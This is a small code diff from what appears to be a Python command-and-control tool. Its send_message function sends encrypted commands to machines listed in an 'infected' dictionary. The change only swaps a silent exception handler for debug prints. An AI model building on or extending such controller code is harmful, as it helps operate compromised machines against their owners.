@@ -228,7 +228,8 @@ def send_message(message, infected_dict):
                 print("mess encrypted")
                 socket_client.send(header + final_mess.encode("utf-8"))
             except Exception:
-                pass
+                print("pb line 231 !")
+                print(Exception)
     else:
         if target in infected_dict:
             # Send the length header followed by the exact command payload
